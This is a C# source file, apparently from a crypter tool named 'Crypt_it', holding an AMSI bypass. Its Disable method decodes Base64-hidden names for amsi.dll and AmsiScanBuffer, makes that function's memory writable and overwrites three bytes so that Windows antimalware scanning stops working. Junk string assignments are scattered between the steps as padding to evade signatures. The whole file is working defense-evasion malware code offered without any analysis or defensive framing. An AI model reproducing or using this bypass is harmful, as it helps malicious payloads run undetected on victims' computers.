using System;
using System.Runtime.InteropServices;

namespace Crypt_it;

public static class AMSI
{
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);

	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("Kernel32.dll")]
	private static extern void RtlMoveMemory(IntPtr dest, IntPtr src, int size);

	public static int Disable()
	{
		string name = Program.Base64Decode("YW1zaS5kbGw=");
		string procName = Program.Base64Decode("QW1zaVNjYW5CdWZmZXI=");
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		IntPtr intPtr = LoadLibrary(name);
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		if (intPtr == IntPtr.Zero)
		{
			return 1;
		}
		IntPtr procAddress = GetProcAddress(intPtr, procName);
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		if (procAddress == IntPtr.Zero)
		{
			return 1;
		}
		UIntPtr dwSize = (UIntPtr)5u;
		uint lpflOldProtect = 0u;
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		if (!VirtualProtect(procAddress, dwSize, 64u, out lpflOldProtect))
		{
			return 1;
		}
		byte[] source = new byte[3] { 49, 255, 144 };
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		IntPtr intPtr2 = Marshal.AllocHGlobal(3);
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		Marshal.Copy(source, 0, intPtr2, 3);
		_ = "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "43j5n234kj5b5b3lk534j5b23k3k42b5" + "q3tregwg54gwrebwewgwgg45g45wggge" + "4354trgrew45y34g45y54g4hg54h5hfh" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v2343" + "klj5h324b5324j5v3jg5v3j5k25v233e" + "45656743tgreg43y54greg54g54g445g" + "45656743tgreg43y54greg54g5gg445g" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j" + "bvesg54t4h56j67j7t8kj87j6rj6j67j";
		RtlMoveMemory(procAddress + 27, intPtr2, 3);
		return 0;
	}
}
